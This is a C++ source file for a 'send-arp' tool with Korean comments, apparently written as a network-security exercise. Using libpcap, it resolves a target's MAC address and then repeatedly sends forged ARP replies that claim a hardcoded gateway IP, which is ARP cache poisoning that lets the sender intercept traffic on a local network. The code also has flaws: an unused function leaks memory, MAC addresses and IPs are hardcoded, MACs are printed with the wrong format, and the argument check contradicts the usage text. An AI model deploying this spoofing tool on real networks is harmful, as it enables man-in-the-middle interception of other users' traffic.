#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <stdint.h>
#include <cstring>

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

typedef struct ARP_INFECTION_PACKET {
	ETHERNET_HDR eth_h;
	ARP_HDR arp_h;
} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 구조체패딩 해제 */

void receive_arp(int c, char* sender_ip){
	ARP_PACKET *packet = new ARP_PACKET;
}

ARP_PACKET send_arp_preparing(
	char* src_mac, char* dst_mac,
	uint8_t oper,
	char* sender_ip, char* target_ip,
	char* sender_mac, char* target_mac) {
	ARP_PACKET packet;

	stringmac_to_bytemac(src_mac, packet.eth_h.ether_shost); // Source MAC address
	stringmac_to_bytemac(dst_mac, packet.eth_h.ether_dhost); // Destination MAC address

	printf("Source MAC: %u, Destination MAC: %u\n", packet.eth_h.ether_shost, packet.eth_h.ether_dhost);

	packet.eth_h.ether_type = htons(0x0806); 	// ARP protocol

	packet.arp_h.hardware_type = htons(0x0001); // Ethernet
	packet.arp_h.protocol_type = htons(0x0800); // IPv4
	packet.arp_h.hardware_length = 0x06; 		// MAC address length
	packet.arp_h.protocol_length = 0x04; 		// IPv4 address length
	packet.arp_h.operation = htons(oper); 		// ARP reply

	stringip_to_byteip(sender_ip, &packet.arp_h.sender_ip_address); 	// Sender IP address
	stringip_to_byteip(target_ip, &packet.arp_h.target_ip_address); 	// Target IP
	stringmac_to_bytemac(sender_mac, packet.arp_h.sender_mac_address); 	// Sender MAC address
	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); 	// Target MAC address

	printf("Sender IP: %hhu.%hhu.%hhu.%hhu, Target IP: %hhu.%hhu.%hhu.%hhu\n",
		packet.arp_h.sender_ip_address & 0xFF, (packet.arp_h.sender_ip_address >> 8) & 0xFF,
		(packet.arp_h.sender_ip_address >> 16) & 0xFF, (packet.arp_h.sender_ip_address >> 24) & 0xFF,
		packet.arp_h.target_ip_address & 0xFF, (packet.arp_h.target_ip_address >> 8) & 0xFF,
		(packet.arp_h.target_ip_address >> 16) & 0xFF, (packet.arp_h.target_ip_address >> 24) & 0xFF);
	printf("Sender MAC: %u, Target MAC: %u\n", packet.arp_h.sender_mac_address, packet.arp_h.target_mac_address);

	return packet;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	while (1){
		for(int i = 2; i < argc; i += 2) {
			/* who has <target_ip>? 요청 */
			ARP_PACKET tip_req_packet = send_arp_preparing(
				"90:de:80:d5:a0:66", "ff:ff:ff:ff:ff:ff",
				0x0001,
				argv[i],argv[i+1],
				"90:de:80:d5:a0:66", "00:00:00:00:00:00"); // ARP request operation
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}

			/* <target_ip> is <target_mac> 응답 */
			ARP_PACKET* tip_res_packet = NULL;
			char sender_ip[16];
			int j = 0;
			for (j = 0; j < 10; j++) {
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(pcap, &header, &packet);
				if (res == 0) continue;
				if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
					break;
				}
				printf("%u bytes captured\n", header->caplen);

				tip_res_packet = (ARP_PACKET*) packet; /* pointer casting */

				byteip_to_stringip(&tip_res_packet->arp_h.sender_ip_address, sender_ip);
				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && ntohs(tip_res_packet->arp_h.operation) == 2 && strncmp(sender_ip, argv[i + 1], 16) == 0) {
					printf("Received ARP reply from %s\n", argv[i + 1]);
					break;
				}
			}
			if (j == 10) continue;

			char dst_mac[18], src_mac[18], sender_mac[18], target_mac[18];
			bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost, dst_mac);
			bytemac_to_stringmac(tip_res_packet->eth_h.ether_shost, src_mac);
			// bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, sender_mac);
			bytemac_to_stringmac(tip_res_packet->arp_h.target_mac_address, target_mac);

			ARP_PACKET packet = send_arp_preparing(
				dst_mac, src_mac,
				0x0002,
				"172.20.10.1", argv[i+1], /* gateway 주소 공격 주소 대신 넣기 */
				dst_mac, target_mac);
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}
			printf("Sent ARP packet from %s to %s\n", argv[i], argv[i + 1]);
		}
	}
	pcap_close(pcap);
}
